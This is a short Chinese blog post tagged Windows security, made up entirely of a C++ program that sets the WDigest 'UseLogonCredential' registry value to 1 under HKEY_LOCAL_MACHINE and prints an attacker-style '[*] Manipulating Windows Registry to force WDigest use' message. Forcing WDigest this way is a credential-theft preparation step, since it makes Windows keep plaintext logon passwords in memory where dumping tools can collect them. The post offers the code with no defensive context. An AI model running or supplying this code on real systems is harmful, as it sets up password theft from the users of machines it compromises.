---
title: c++ 修改注册表键值
date: 2019-10-16 01:18:46
tags: windows安全
---

```c++
#include <windows.h>
#include <tchar.h>
#include <iostream>

using namespace std;

void UseLogonCredential();


int main()
{
	UseLogonCredential();
}


void UseLogonCredential()
{
	long	lRet;
	HKEY	hKey;
	DWORD	WDigest;
	DWORD	dwType = REG_DWORD;
	DWORD	dwValue;
	DWORD	dwuC = 1;
	lRet = RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		_T( "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" ),
		0,
		KEY_QUERY_VALUE | KEY_SET_VALUE,
		&hKey
		);                      /* 打开注册表 */
	if ( lRet == ERROR_SUCCESS )    /* 读操作成功 */
	{
		lRet = RegQueryValueEx(
			hKey,
			_T( "UseLogonCredential" ),
			0,
			&dwType,
			(LPBYTE) &WDigest,
			&dwValue
			); 

		//不存在该键则不修改
		
		if ( lRet != 2 && WDigest != 1 )
		{
		
			printf( "[*] Manipulating Windows Registry to force WDigest use." );
			lRet = RegSetValueEx( hKey, _T( "UseLogonCredential" ), 0, REG_DWORD, (BYTE *) &dwuC, sizeof(DWORD) );
			if ( lRet != 0 )
			{
				_tprintf( TEXT( "\nRegSetValueEx failed with error %u\n" ), lRet );
			}
		}
        if(WDigest == 1){
            //修改成功
            printf( "[*] Manipulating Windows Registry to force WDigest use." );

        }
	}
    RegCloseKey(hKey);
}
```